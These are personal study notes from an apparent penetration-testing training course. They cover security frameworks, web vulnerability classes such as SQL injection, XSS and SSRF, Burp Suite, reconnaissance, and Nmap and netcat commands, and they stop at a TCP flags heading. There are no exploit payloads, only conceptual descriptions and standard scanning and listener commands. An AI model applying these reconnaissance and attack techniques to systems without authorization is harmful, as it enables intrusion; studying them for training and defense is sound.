# Jr Penetration Tester
### Introduction to Cyber Security

- Refer to Pre Security Notes

## Introduction to Pentesting

### Pentesting Fundamentals
- A penetration test or pentest is an ethically-driven attempt to test and analyze the security defenses to protect these assets and pieces of information. A penetration test involves using the same tools, techniques, and methodologies that someone with malicious intent would use and is similar to an audit.
- A cybersecurity industry magazine stated that there are over 2,200 cyber attacks every day - 1 attack every 39 seconds.
- A penetration test is an authorized audit of a computer system's security and defenses as agreed by the owners of the systems. The legaility of penetration is pretty clear-cut in this sense; anything that falls outside of this agreement is deemed unauthorized.
- Before a penetration test starts, a formal discussion occurs between the penetration tester and the system owner. Various tools, techniques, and systems to be tested are agreed on. This discussion forms the scope of the penetration testing agreement and will determine the course the penetration test takes.
- Hackers are sorted into three hats, where their ethics and motivations behind their actions determine what hat category they are placed into.
    - White hat - These hackers are considered the "good people". They remain within the law and use their skills to benefit others.
    - Grey hat - These people use their skills to benefit others often; however, they do not respect/follow the law or ethical standards at all times.
    - Black hat - These people are criminals and often seek to damage organizations or gain some form of financial benefit at the cost of others.
 - Rules of Engagement (ROE) - The ROE is a document that is created at the initial stages of a penetration testing engagement. This document consists of three main sections, which are ultimately responsible for deciding how the engagement is carried out.
     - Permission - This section of the document gives explicit permission for the engagement to be carried out. This permission is essential to legally protect individuals and organizations for the activities they carr out.
     - Test Scope - This section of the document will annotate specific targets to which the engagemetn should apply. For example, the penetration test may only apply to certain servers or applications but not the entire network.
     - Rules - The rules section will define exactly the techniques that are permitted during the engagement. For example, the rules may specifically state that techniques such as phishing attacks are prohibited, but MITM (Man-in-the-Middle) attacks are okay.
- The steps a penetration tester takes during an engagement is known as the methodology. A general theme seen in industry-standard methodologies are:
    - Information Gathering - This stage involves collecting as much publically accessible information about a target/organization as possible, for example, OSINT (Open Source Intelligence) and research. NOTE: This does not involve scanning any systems.
    - Enumeration/Scanning - This stage involves discovering applications and services running on the systems. For example, finding a web server that may be potentially vulnerable.
    - Exploitation - This stage involves leveraging vulnerabilities discovered on a system or application. This stage can involve the use of public exploits or exploiting application logic.
    - Privilege Escalation - Once you have successfully exploited a system or application (known as a foothold), this stage is the attempt to expand your access to a system. You can escalate horizontally and vertically, where horizontaly is accessing another account of the same permission group (i.e. another user), whereas vertically is that of another permission group (i.e. an administrator).
    - Post-exploitation - This stage involves a few sub-stages: 1) What other hosts can be targeted (pivoting). 2) What additional information can we gather from the host now that we are a privileged user. 3) Cover your tracks. 4) Reporting.
- The Open Source Security Testing Methodology Manual (OSSTMM) provides a detailed framework of testing strategires for systems, software, applictions, communications, and the human aspect of cybersecurity. The methodology focuses on how these systems, applications communicate, so it includes a methodology for: 1) Telecommunications (phones, VoIP, etc.), 2) Wired Networks, 3) Wireless communications
- Open Web Application Security Project (OWASP) framework is a community-driven and frequently updated framework used solely to test the securiyt of web applications and services. The foundation regularly writes reports stating the top ten security vulnerabilities a web application may have, the testing approach, and remediation.
- NIST Cybersecurity Framework is a popular framework used to improve an organizations cybersecruity standards and manage the risk of cyber threats. The framework provides guidelines on security controls & benchmarks for success for organizations from critical infrastructure (power plants, etc.) all through to commercial. There is a limited section on a standard guideline for the methodology a penetration tester shoul take.
- National Cyber Security Centre Cyber Assessment Framework (NCSC CAF) is an extensive framework of fourteen principles used to assess the risk of various cyber threats and an organization's defenses against these. The framework applies to organizations considered to perform "vitally important services and activies" such as critical infrastructure, banking, and the likes. The framework mainly focuses on and assess the following topics: 1) Data Security, 2) System security, 3) Identity and access control, 4) Resiliency, 5) Monitoring, 6) Response and recovery planning.

![[Pasted image 20260224131140.png]]

- Black-Box Testing: This testing process is a high-level process where the tester is not given any information about the inner workings of the application or service.
- Grey-Box Testing: This testing process is the most popular for things such as penetration testing. It is a combination of both black-box and white-box testing processes. The tester will have some limited knowledge of the internal components of the application or piece of software.
- White-Box Testing: This tesing process is a low-level process usually done by a software developer who knows programming and application logic. The tester will have full knowledge of the application and its expected behaviour and is much more time consuming thna black-box testing.
### Principles of Security
- Defense in Depth is the use of multiple varied layers of security to an organization's systems and data in the hopes that multiple layers will provide redundancy in an organization's security perimeter.
- The CIA triad is an information security model that is used in consideration throughout creating a security policy. This model has an extensive background, ranging from being used in 1998.
- Consisting of three sections: Confidentiality, Integrity, and Availability (CIA), this model has quickly become an industry standard today. 
![[Pasted image 20260224131219.png]]
- The CIA triad is unlike a traditional model where you have individual sections; instead, it is a continuous cycle.
- **Confidentiality** - This element is the protection of data from unauthorized access and misuse. To provide confidentiality is to protect this dat from parties that it is not intended for.
- **Integrity** - The CIA triad element of integrity is the condition where information is kept accurate and consistent unless authorized changes are made. Hash verifications and digital signatures can help to ensure that transactions are authentic and that flat files have not been modified or corrupted.
- **Availability** - In order for data to be useful, it must be available and accessible by the user. The main concern in the CIA triad is that the information should be available when authorized users need access to it. 
- The levels of access given to individuals are determined by two primary factors: 1) The individual's role/function within the organization. 2) The sensitivity of the information being stored on the system.
- Two key concepts are used to assign and manage the access rights of individuals: Privileged Indentity Management (PIM) and Privileged Access Management (PAM).
- PIM is used to translate a user's role within an organization into an access role on a system.
- PAM is the management of the privileges a system's access role has, amongst other things.
- Some popular and effective security models are used to achieve the three elements of the CIA triad.
- The Bell-La Padula Model is used to achieve confidentiality. This model has a few assumptions, such as an organization's hierarchical structure it is used in, where everyone's responsibilities/roles are well-defined. The model works by granting access to pieces of data (called objects) on a strictly need to know bais. This model uses the rule "no write up, no read up".
- The Bell LaPadula Model is popular within organizations such as governmental and military. 
![[Pasted image 20260224131314.png]]

- The Biba model is arguably the equivalent of the Bell-La Padula model but for the integrity of the CIA triad. This model applies to the rule to objects (data) and subjects (users) that can be summarized as "no write up, no read down". This rule means that subjects can create or write content to objects at or below their level but can only read the contents of objects above the subject's level.

- The Biba model is used in organizations or situations where integrity is more important than confidentiality. For example, in software development, developers may only have access to the code that is necessary for their job.
![[Pasted image 20260224131328.png]]
- Threat modelling is the process of reviewing, improving, and testing the security protocols in place in an organization's information technology infrastructure and services.
![[Pasted image 20260224131355.png]]
- An effective threat model includes: Threat Intelligence, Asset Identification, Mitigation Capabilities, Risk Assessment.
- For threat modelling, there are frameworks such as STRIDE (--S--poofing identity, --T--ampering with data, --R--epudiation threats, --I--nformation disclosure, --D--enial of Service, and --E--levation of privileges) and PASTA (--P--rocess for --A--ttack --S--imulation and --T--hreat --A--nalysis).
- STRIDE:
    - Spoofing - This principle requires you to authenticate requests and users accessing a system. Spoofing involves a malicious party falsely identify itself as another. Access keys (such as API keys) or signatures via encryption helps to remediate this threat.
    - Tampering - By providing anti-tampering measures to a system or application, you help provide integrity to the data. Data that is accessed must be kept integral and accurate. For example, shows use seals on food products.
    - Repudiation - This principle dictates the use of services such as logging of activity for a system or application to track.
    - Information Disclosure - Applications or services that handle information of multiple users need to be appropriately configured to only show information relevant to the owner.
    - Denial of Service - Applications and services use up system resources, these two things should have measures in place so that abuse of the application/service won't result in bringing the whole system down.
    - Elevation of Privilege - This is the worst-case scenario for an application or service. It means that a user was able to escalate their authorization to that of a higher level i.e. an administrator. This scenario often leads to further exploitation or information disclosure.
 - A breach of security is known as an incident. Actions taken to resolve and remediate the threat are known as Incident Response (IR) and are a whole career path in cybersecurity.
 - Incidents are classified using a rating of urgency and impact. Urgency will be determined by the type of attack faced, where the impact will be determined by the affected system and what impact that has on business operations. 
![[Pasted image 20260224131419.png]]
- An incident responded to by a --C--omputer --S--eurity --I--ncident --R--esponse --T--eam (CSIRT) which is prearranged group of employees with technical knowledge about the systems and/or current incident.
- To successfully solve an incident, these steps are often referred to as the six phases of Incident Response that takes place:
    1. **Preparation** - Do we have the resources and plans in place to deal with the security incident?
    2. **Identification** - Has the threat and the threat actor been correctly identified in order for us to respond to?
	3. **Containment** - Can the threat/security incident be contained to prevent other systems or users from being impacted?
    4. **Eradication** - Remove the active threat.
    5. **Recovery** - Perform a full review of the impacted systems to return to business as usual operations.
    6. **Lessons Learned**  - What can be learnt from the incident? I.e. if it was due to a phishing email, employees should be trained to better detect phishing emails. 
## Introduction to Web Hacking
### Walking An Application
- Here is a short breakdown of the in-built browser tools that are used throughout this room:
	- **View Source** - Use your browser to view the human-readable source code of a website. 
	- **Inspector** - Learn how to inspect page elements and make changes to view usually blocked content.
	- **Debugger** - Inspect and control the flow of page's JavaScript.
	- **Network** - See all the network requests a page makes.
- As a penetration tester, your role when reviewing a website or web application is to discover features that could potentially be vulnerable and attempt to exploit them to assess whether or not they are.
- Finding interactive portions of the website can be as easy as spotting a login form to manually review the website's JavaScript. 
- An excellent pace to start is just with your browser exploring the website and noting down the individual pages/areas/features with a summary for each one.
- **Viewing Page Source** - The page source is the human-readable code returned to our browser/client from the web server each time we make a request.
- While viewing a website, you can right-click on the page, and you'll see an option menu that says View Page Source. 
- Most browsers support putting view-source: in front of the URL for example, view-source:https://google.com
- HTML commenting looks like \<!-- and ends with -->
- **Developer Tools - 
- Every modern browser includes developer tools; this is a tool kit used to aid web developers in debugging web applications and gives you a peek under the hood of a website to see what is going on. 
- The way to access developer tools is different for every browser. 
- **Inspector** - The page source doesn't always represent what's shown on a webpage; this is because CSS, JavaScript, and user interaction can change the content and style of the page. 
- Element inspector assists us with this by providing us with a live representation of what is currently on the website. 
- As well as viewing this live view, we can also edit and interact with the page elements, which is helpful for web developers to debug issues. 
- **Developer Tools - Debugger** - This panel in the developer tools is intended for debugging JavaScript, and again is an excellent feature for web developers wanting to work out why something might not be working. 
- **Developer Tools - Network** - The network tab on the developer tools can be used to keep track of every external request a webpage makes. 
### Content Discovery
- Content can be many things, a file, video, picture, backup, a website feature.
- When we talk about content discovery, we're not talking about the obvious things we can see on a website; it's the things that aren't immediately presented to us and that weren't always intended for public access.
- The robots.txt file is a document that tells search engines which pages they are and aren't allowed to show on their search engine results or ban specific search engines from crawling the website altogether. 
- **Favicon** - The favicon is a small icon displayed in the browser's address bar or tab used for branding a website. 
![[Pasted image 20260225095150.png]]
- Sometimes when frameworks are used to build a website, a favicon that is part of the installation gets leftover, and if the website developer doesn't replace this with a custom one, this can give us a clue on what framework is in use.
- **Sitemap.xml** - Unlike the robots.txt file, which restricts what search engine crawlers can look at, the sitemap.xml file gives a list of every file the website owner wishes to be listed on a search engine. 
- **HTTP Headers** - When we make requests to the web server, the server returns various HTTP headers. These headers can sometimes contain useful information such as the webserver software and possibly the programming/scripting language in use. 
- **Framework Stack** - Once you've established the framework of a website, either from the above favicon example or by looking for clues in the page source such as comments, copyright notices or credits, you can then locate the framework's website. From there, we can learn more about the software and other information, possibly leading to more content we can discover.
- **OSINT (Open-Source Intelligence) - Google Hacking / Dorking**: There are also external sources available that can help in discovering information about your website; these resources are often referred to as OSINT as they're freely available tools that collect information.
	- Google hacking / Dorking utilizes Google's advanced search engine features, which allow you to pick out custom content. 

| Filter   | Example            | Description                                                   |
| -------- | ------------------ | ------------------------------------------------------------- |
| site     | site:tryhackme.com | returns only from the specified website address               |
| inurl    | inurl:admin        | returns results that have the specified word in the URL       |
| filetype | filetype:pdf       | returns results which are a particular file extension         |
| intitle  | intitle:admin      | returns results that contain the specified word in the tittle |
- More information about google hacking can be found here: https://en.wikipedia.org/wiki/Google_hacking
- **OSINT - Wappalyzer**: Wappalyzer (https://www.wappalyzer.com/) is an online tool and browser extension that helps identify what technologies a website uses, such as frameworks, Content Management Systems (CMS), payment processors and much more, and it can even find version numbers as well.
- **OSINT - Wayback Machine** - The Wayback Machine (https://archive.org/web/) is a historical archive of websites that dates back to the late 90s. You can search a domain name, and it will show you all the times the service scraped the web page and saved the contents. This service can help uncover old pages that may still be active on the current website. 
- **OSINT - GitHub**: To understand GitHub, you first need to understand Git. Git is a version control system that tracks changes to files in a project. Working in a team is easier because you can see what each team member is editing and what changes they made to files. GitHub is a hosted version of Git on the Internet. You can use GitHub's search feature to look for company names or website names to try and locate repositories belonging to your target. 
- **OSINT - S3 Buckets**: S3 buckets are a storage provided by Amazon AWS, allowing people to save files and even static website content in the cloud accessible over HTTP and HTTPS. The owner of the files can set access permissions to either make files public, private, and even writeable. Sometimes these access permissions are incorrectly set and inadvertently allow access to files that shouldn't be available to the public. The format of the S3 buckets is http(s)://{name}.s3.amazon.aws.com where {name} is decided by the owner.
- **Automated Discovery** - Automated discovery is the process of using tools to discover the content rather than doint it manually. 
- An excellent resource for wordlists that is preinstalled on the THM AttackBox is https://github.com/danielmiessler/SecLists, which Daniel Miessler curates.
### Subdomain Enumeration
- Subdomain enumeration is the process of finding valid subdomains for a domain, but why do we do this? We do this to expand our attack surface to try and discover more potential points of vulnerability. 
- **OSINT - SSL/TLS Certificates** - When an SSL/TLS certificate is created for a domain by a CA (Certificate Authority), CA's take part in what's called "Certificate Transparency (CT) logs". These are publicly accessible logs of every SSL/TLS certificate created for a domain name. 
- **DNS Bruteforce** - Bruteforce DNS enumeration is a method of trying tens, hundreds, thousands, or even millions of different possible subdomains from a pre-defined list of commonly used subdomains. 
- **OSINT - Sublist3r** - To speed up the process of OSINT domain discovery, we can automate the above methods with the help of tools like Sublist3r (https://www.kali.org/tools/sublist3r/).
- **Virtual Hosts** - Some subdomains aren't always hosted in publicly accessible DNS results, such as development versions of a web application or administration portals. Instead, the DNS record could be kept on a private DNS server or recorded on the developer's machines in their /etc/hosts file (or c:\windows\system32\drivers\etc\host file for Windows users), which maps domain names to IP addresses. 
### Authentication Bypass
- **Username Enumeration** - Website error messages are great resources for collating information to build list of valid usernames. 
- The **ffuf** tool can be used to brute force username and/or passwords.
- Sometimes authentication processes contain logic flaws. A logic flaw is when the typical logical path of an application is either bypassed, circumvented, or manipulated by a hacker. 
- **Cookie Tampering** - Examining and editing the cookies set by the web server during your online session can have multiple outcomes, such as unauthenticated access, access to another user's account, or elevated privileges. 
### IDOR
- IDOR stands for Insecure Direct Object Reference and is a type of access control vulnerability. This type of vulnerability can occur when a web server receives user-supplied input to retrieve objects (files, data, documents), too much trust has been placed on the input data, and it is not validated on the server-side to confirm the requested object belongs to the user requesting it.
- The vulnerable endpoint you're targeting may not always be something you see in the address bar. It could be content your browser loads in via an AJAX request or something that you find referenced in a JavaScript file. 
### File Inclusion
- In some scenarios, web applications are written to request access to files on a given system, including images, static text, and so on via parameters. Parameters are query parameter strings attached to the URL that could be used to retrieve data or perform actions based on user input.
![[Pasted image 20260225141139.png]]
- The main issue of these vulnerabilities is the input validation, in which the user inputs are not sanitized or validated, and the user controls them. 
- **Directory traversal** - a web security vulnerability allows an attacker to read operating system resources, such as local files on the server running an application. 
![[Pasted image 20260225141357.png]]
- Local File Inclusion (LFI) attacks against web applications are often due to a developer's lack of security awareness. 
- **Remote File Inclusion (RFI)** is a technique to include remote files into a vulnerable application. Like LFI, the RFI occurs when improperly sanitizing input, allowing an attacker to inject an external URL into **include** function. One requirement for RFI is that the **allow_url_fopen** option needs to be on. 
- The risk of RFI is higher than LFI since RFI vulnerabilities allow an attacker to gain Remote Code Execution (RCE) on the server. 
### Intro to SSRF
- SSRF stands for Server-Side Request Forgery. It's a vulnerability that allows a malicious user to cause the webserver to make an additional or edited HTTP request to the resource of the attacker's choosing. 
- There are two types of SSRF vulnerability; the first is a regular SSRF where the data is returned to the attacker's screen. The second is a Blind SSRF vulnerability where an SSRF occurs, but no information is returned to the attacker's screen. 
- Below are four common places to look for SSRF vulnerabilities:
	- When a full URL is used in a parameter in the address bar:
	- ![[Pasted image 20260225142506.png]]
	- A hidden field in a form:
	- ![[Pasted image 20260225142523.png]]
	- A partial URL such as just the hostname:
	- ![[Pasted image 20260225142543.png]]
	- Or perhaps only the path of the URL:
	- ![[Pasted image 20260225142556.png]]
### Intro to Cross-site Scripting
- Cross-site Scripting, better known as XSS in the cybersecurity community, is classified as an injection attack were malicious JavaScript gets injected into a web application with the intention of being executed by other users.
- In XSS, the payload is the JavaScript code we wish to be executed on the targets computer. There are two parts to the payload, the intention and the modification. 
- Reflected XSS happens when user-supplied data in an HTTP request is included in the webpage source without any validation. 
- Stored XSS, as the name infers, the XSS payload is stored on the web application (in a database, for example) and then gets run when other users visit the sit or web page. 
- **DOM Based XSS** - DOM stands for Document Object Model and is a programming interface for HTML and XML documents. It represents the page so that programs can change the document structure, style, and content. 
	- DOM based XSS is where the JavaScript execution happens directly in the browser without any new pages being loaded or data submitted to backend code. Execution occurs when the website JavaScript code acts on input or user interaction. 
- Blind XSS is similar to a stored XSS in that your payload gets stored on the webite for another user to view, but in this instance, you can't see the payload working or be able to test it against yourself first. 
### Race Conditions
- A race condition is a situation in a computer programs where the timing of events influences the behavior and outcome of the program. It typically happens when a variable gets accessed and modified by multiple threads. Due to a lack of proper lock mechanisms and synchronization between the different threads, an attacker might abuse the system and apply a discount multiple times or make money transactions beyond their balance. 
- A thread is a lightweight unit of execution. It shares various memory parts and instructions with the process. 
- To exploit Race Conditions, you can utilize Burp Suite: Repeater. 
### Command Injection
- Command injection is the abuse of an application's behavior to execute commands on the operating system, using the same privileges that the application on a device is running with.
- Command injection is also often known as "Remote Code Execution" (RCE) because of the ability to execute code within an application. 
- Command Injection can be detected in mostly one of two ways:

| Method  | Description                                                                                                                                                                                                                                                                     |
| ------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| Blind   | This type of injection is where there is no direct output from the application when testing payloads. You will have to investigate the behaviors of the application to determine whether or not your payload was successful.                                                    |
| Verbose | This type of injection is where there is direct feedback from the application once you have tested a payload. For example, running the **whoami** command to see what user the application is running under. The web application will output the username on the page directly. |
### SQL Injection
- SQL (Structured Query Language) Injection, mostly referred to as SQLi, is an attack on a web application database server that causes malicious queries to be executed. When a web application communicates with a database using input from a user that hasn't been properly validated there runs the potential of an attacker being able to steal, delete, or alter private and customer data and also attack the web application authentication methods to private or customer areas. 
- The point wherein a web application using SQL can turn into SQL Injection is when user-provided data gets included in the SQL query. 
- In-Band SQL Injection is the easiest type to detect and exploit; In-Band just refers to the same method of communication being used to exploit the vulnerability and also receive the results, for example, discovering an SQL Injection vulnerability on a website page and then being able to extract data from the database to the same page.
- Blind SQLi - Unlike In-Band SQL injection, where we can see the results of our attack directly on the screen, blind SQLi is when we get little to no feedback to confirm whether our injected queries were, in fact, successful or not, this is because the error messages have been disabled, but the injection still works regardless.
## Burp Suite
### Burp Suite: The Basics
- In essence, Burp Suite is a Java-based framework designed to serve as a comprehensive solution for conducting web application penetration testing. It has become the industry standard tool for hands-on security assessments of web and mobile applications, including those that rely on application programming interfaces (APIs). 
- Simply put, Burp Suite captures and enables manipulation of all the HTTP/HTTPS traffic between a browser and a web server. 
- Some key features of Burp Suite Community:
	- **Proxy** - The Burp Proxy is the most renowned aspect of Burp Suite. It enables interception and modification of requests and responses while interacting with web applications. 
	- **Repeater** - Another well-known feature. Repeater allows for capturing, modifying, and resending the same request multiple times. This functionality is particularly useful when crafting payloads through trial and error or testing the functionality of an endpoint for vulnerabilities. 
	- **Intruder** - Despite rate limitations in Burp Suite Community, Intruder allows for spraying endpoints with requests. It is commonly utilized for brute-force attacks or fuzzing endpoints.
	- **Decoder** - Decoder offers a valuable service for data transformation. It can decode captures information or encode payloads before sending them to the target. While alternative services exist for this purpose, leveraging Decoder within Burp Suite can be highly efficient. 
	- **Comparer** - As the name suggests, Comparer enables the comparison of two pieces of data at either the word or byte level. While not exclusive to Burp Suite, the ability to send potentially large data segments directly to a comparison tool with a single keyboard shortcut significantly accelerates the process.
	- **Sequencer** - Sequencer is typically employed when assessing the randomness of tokens, such as session cookie values or other supposedly randomly generate data. If the algorithm used for generating these values lack secure randomness, it can expose avenues for devastating attacks. 
- **Intercepting Requests:** When requests are made through the Burp Proxy, they are intercepted and held back from reaching the target server. The requests appear in the Proxy tab, allowing for further actions such as forwarding, dropping, editing, or sending them to other Burp modules. 
- By setting a scope for the project, we can define what gets proxied and logged in Burp Suite. We can restrict Burp Suite to target only the specific web application(s) we want to test. 
### Burp Suite: Repeater
- In essence, Burp Suite Repeater enables us to modify and resend intercepted requests to a target of our choosing. 
- Once a request has been captured in the Proxy module, we can send it to Repeater by either right-clicking on the request and selecting **Send to Repeater**, or by utilizing the keyboard shortcut **CTRL + R**. 
### Burp Suite: Intruder
- Intruder is Burp Suite's built-in fuzzing tool that allows for automated request modification and repetitive testing with variations in input values. By using a captured request (often from the Proxy module), Intruder can send multiple requests with slightly altered values based on user-defined configurations. 
- Intruder's functionality is comparable to command-line tools like Wfuzz or ffuf. 
- When using Burp Suite Intruder to perform an attack, the first step is to examine the positions within the request where we want to insert our payloads.
- The **Positions** tab of Burp Suite Intruder has a dropdown menu for selecting the attack type. Intruder offers four attack types, each serving a specific purpose.
	- **Sniper**: The Sniper attack is the default and most commonly used option. It cycles through the payloads, inserting one payload at a time into each position defined in the request. Sniper attacks iterate through all the payloads in a linear fashion, allowing for precise and focused testing.
	- **Battering ram**: The Battering ram attack type differs from Sniper in that it sends all payloads simultaneously , each payload inserted into its respective position. This attack type is useful when testing for race conditions or when payloads need to be sent concurrently.
	- **Pitchfork**: The Pitchfork attack type enables simultaneous testing of multiple positions with different payloads. It allows the tester to define multiple payload sets, each associated with a specific position in the request. Pitchfork attacks are effective when there are distinct parameters that need separate testing.
	- **Cluster bomb**: The Cluster bomb attack type combines the Sniper and Pitchfork approaches. It performs a Sniper-like attack on each position but simultaneously tests all payloads from each set. This attack type is useful when multiple positions have different payloads and we want to test them all together. 
### Burp Suite: Other Modules
- The Decoder module of Burp Suite gives user data manipulation capabilities. As implied by its name, it not only decodes data intercepted during an attack but also provides the function to encode our own data, prepping it for transmission to the target. 
- **Comparer**, as the name implies, lets us compare two pieces of data, either by ASCII words or by bytes. 
- **Sequencer** allows us to evaluate the entropy, or randomness, of "tokens." Tokens are strings used to identify something and should ideally be generated in a cryptographically secure manner. These tokens could be session cookies or Cross-Site Request Forgery (CSRF) tokens used to protect form submission. 
- **Organizer** - The Organizer module of Burp Suite is designed to help you store and annotate copies of HTTP requests that you may want to revisit later. This tool can be particularly useful for organizing your penetration testing workflow.
## Network Security
### Passive Reconnaissance
- Reconnaissance (recon) can be defined as a preliminary survey to gather information about a target. It is the first step in The Unified Kill Chain ([Unified Kill Chain: Raising Resilience Against Cyber Attacks](https://www.unifiedkillchain.com/)) to gain an initial foothold on a system. We divide reconnaissance into:
	- Passive Reconnaissance
	- Active Reconnaissance
- In passive reconnaissance, you rely on publicly available knowledge. It is the knowledge that you can access from publicly available resources without directly engaging with the target.
- Passive reconnaissance activities include many activities, for instance:
	- Looking up DNS records of a domain from a public DNS server.
	- Checking job ads related to the target website.
	- Reading news articles about the target company.
- Active Reconnaissance, on the other hand, cannot be achieved so discreetly. It requires engagement with the target. 
- Examples of active reconnaissance activities include:
	- Connecting to one of the company servers such as HTTP, FTP, and SMTP.
	- Calling the company in an attempt to get information (social engineering). 
	- Entering company premises pretending to be a repairman. 
- **WHOIS** is a request and response protocol that follows the RFC 3912 (https://www.ietf.org/rfc/rfc3912.txt) specification. A **WHOIS** server listens on TCP port 43 for incoming requests. The domain registrar is responsible for maintaining the WHOIS records for the domain names it is leasing. 
![[Pasted image 20260225160138.png]]
- Find the IP address of a domain name using **nslookup**, which stands for Name Server Look Up. You need to issue the command **nslookup DOMAIN_NAME**, for example, **nslookup tryhackme.com**. 
- For more advanced DNS queries and additional functionality, you can use **dig**, the acronym for "Domain Information Groper," if you are curious. 
![[Pasted image 20260225160557.png]]
- **DNSDumpster** ([DNSDumpster - Find & lookup dns records for recon & research](https://dnsdumpster.com/)) helps to discover subdomains, rather than having to rely on brute-forcing queries. 
- **Shodan.io** - When you are tasked to run a penetration test against specific targets, as part of the passive reconnaissance phase, a service like https://www.shodan.io/ can be helpful to learn various pieces of information about the client's network, without actively connecting to it. 
- Shodan.io tries to connect to every device reachable online to build a search engine of connected "things" in contrast with a search engine for web pages. 
### Active Reconnaissance
- Active reconnaissance requires you to make some kind of contact with your target.
- **Web Browser** - The web browser can be a convenient tool, especially that it is readily available on all systems.
- A few add-ons for Firefox and Chrome that can help in penetration testing:
	- **FoxyProxy** - lets you quickly change the proxy server you are using to access the target website.
	- **User-Agent Switcher and Manager** - gives you the ability to pretend to be accessing the webpage from a different operating system or different web browser. 
	- **Wappalyzer** - provides insights about the technologies on the visited websites.
- **Ping** - In simple terms, the ping command sends a packet to a remote system, and the remote system replies. This way, you can conclude that the remote system is online and that the network is working between the two systems.
- You can use ping as **ping Machine_IP** or **ping HOSTNAME**. 
- Will need to hit **CTRL+C** to force ping to stop if you don't specify the count in Linux (ex. **ping -c 10 MACHINE_IP**). 
- **Traceroute** - as the name suggests, the traceroute command traces the route taken by the packets from your system to another host. The purpose of a traceroute is to find the IP addresses of the routers or hops that a packet traverses as it goes from your system to a target host.
	- On Linux and macOS, the command to use is **traceroute MACHINE_IP**, and on MS Windows, it is **tracert MACHINE_IP**. Traceroute tries to discover the routers across the path from your system to the target system. 
- **TELNET** (Teletype Network) protocol was developed in 1969 to communicate with a remote system via a command-line interface (CLI). The default port used by telnet is 23. From a security perspective, **telnet** sends all data, including usernames and passwords, in cleartext. 
- Using **telnet MACHINE_IP PORT**,  you can connect to any service running on TCP and even exchange a few messages unless it uses encryption. 
- **Netcat** - Netcat or simply **nc** has different applications that can be of great value to a pentester. Netcat supports both TCP and UDP protocols. It can function as a client that connects to a listening port; alternatively, it can act as a server that listens on a port of your choice. 
	- You can connect to a server using **nc MACHINE_IP PORT**, which is quite similar to **telnet MACHINE_IP PORT**. Note that you may need top press SHIFT+ENTER after the GET line. 
![[Pasted image 20260227101638.png]]
- You can use netcat to listen on a TCP port and connect to a listening port on another system.
- On the server system, where you want to open a port and listen on it, you can issue **nc -lp 1234** or better yet, **nc -vnlp 1234**. The exact order of the letters does not matter as long as the port number is preceded directly by **-p**.

| Option | Meaning                                                    |
| ------ | ---------------------------------------------------------- |
| -l     | Listen mode                                                |
| -p     | Specify the Port number                                    |
| -n     | Numeric only; no resolution of hostnames via DNS           |
| -v     | Verbose output (optional, yet useful to discover any bugs) |
| -vv    | Very Verbose (optional)                                    |
| -k     | Keep listening after client disconnects                    |
**Putting It All Together**

| Command          | Example                                     |
| ---------------- | ------------------------------------------- |
| ping             | **ping -c 10 MACHINE_IP** on Linux or macOS |
| ping             | **ping -n 10 MACHINE_IP** on MS Windows     |
| traceroute       | **traceroute MACHINE_IP** on Linux or macOS |
| tracert          | **tracert MACHINE_IP** on MS Windows        |
| telnet           | **telnet MACHINE_IP PORT_NUMBER**           |
| netcat as client | **nc MACHINE_IP PORT_NUMBER**               |
| netcat as server | **nc -lvnp PORT_NUMBER**                    |
**Developer Tools**
Linux or MS Windows - Ctrl + Shift + I
macOS - Option + Command + I

### Nmap Live Host Discovery
- Nmap, short for Network Mapper, is free, open-source software released under the GPL license, created by Gordon Lyon (Fyodor), a network security expert and open-source programmer. 
- Nmap is an industry-standard tool for mapping networks, identifying live hosts, and discovering running services. 
- A Nmap scan usually goes through the steps shown in the figure below:
![[Pasted image 20260227102607.png]]
- In an IP network a subnetwork is usually the equivalent of one or mor network segments connected together and configured to use the same router. The network segment refers to a physical connection, while a subnetwork refers to a logical connection. 
- If you are on the same subnet, you would expect your scanner to use ARP Address Resolution Protocol queries to discover live hosts. An ARP query aims to obtain the hardware address (MAC address) that that communication at the link layer becomes possible; however, we can infer that the host is online. 
- **Enumerating Targets** - Generally speaking, you can provide a list, a range, or a subnet with nmap.
	- list: MACHINE_IP scanme.nmap.org example.org will scan 3 IP addresses
	- range: 10.11.12.15-20 will scan 6 IP addresses: 10.11.12.15, 10.11.12.16,... and 10.11.12.20
	- subnet: MACHINE_IP/30 will scan 4 IP addresses
- You can also provide a file as input for your list of targets, **nmap -iL list_of_hosts.txt**. 
- **Discovering Live Hosts** - We will leverage the TCP/IP layers to discover the live hosts.
![[Pasted image 20260227103813.png]]
- **Nmap Host Discovery Using ARP**  - If you want Nmap only to perform an ARP scan without port-scanning, you can use **nmap -PR -sn TARGETS**, where **-PR** indicates that you only want an ARP scan. 
- **Nmap Host Discovery Using ICMP** - We can ping every IP address on a target network and see who would respond to our **ping** (ICMP Type 8/ECHO) request with a ping reply (ICMP Type 0). However, many firewalls block ICMP echo; new versions of MS Windows are configured with a host firewall that blocks ICMP echo requests by default. 
- **Nmap Host Discovery Using TCP and UDP** - We can send a packet with the SYN (Synchronize) flag set to a TCP port, 80 by default, and wait for a response. An open port should reply with a SYN/ACK (Acknowledge); a closed port would result in an RST (Reset). 
- We can use UDP to discover if the host is online. Contrary to TCP SYN ping, sending a UDP packet to an open port is not expected to lead to any reply. However, if we send a UDP packet to a closed UDP port, we expect to get an ICMP port unreachable packet; this indicates that the target system is up and available.

| Scan Type              | Example Command                           |
| ---------------------- | ----------------------------------------- |
| ARP Scan               | sudo nmap -PR -sn MACHINE_IP/24           |
| ICMP Echo Scan         | sudo nmap - PE -sn MACHINE_IP/24          |
| ICMP Timestamp Scan    | sudo nmap -PP -sn MACHINE_IP/24           |
| ICMP Address Mask Scan | sudo nmap -PM -sn MACHINE_IP/24           |
| TCP SYN Ping Scan      | sudo nmap -PS22,80,443 -sn MACHINE_IP/30  |
| TCP ACK Ping Scan      | sudo nmap -PA22,80,443 -sn MACHINE_IP/30  |
| UDP Ping Scan          | sudo nmap -PU53,161,162 -sn MACHINE_IP/30 |
- Remember to add **-sn** if you are only interested in host discovery without port-scanning. Omitting **-sn** will let Nmap default to scanning live hosts for ports.

| Option | Purpose                          |
| ------ | -------------------------------- |
| -n     | no DNS lookup                    |
| -R     | reverse-DNS lookup for all hosts |
| -sn    | host discovery only              |

### Nmap Basic Port Scans
- At the risk of oversimplification, we can classify ports in two states:
	- Open port indicates that there is some service listening on that port.
	- Closed port indicates that there is no service listening on that port.
- **TCP Header**
![[Pasted image 20260227130051.png]]

- **TCP Flags** 
	- **URG** - Urgent flag indicates that the urgent pointer field is significant.
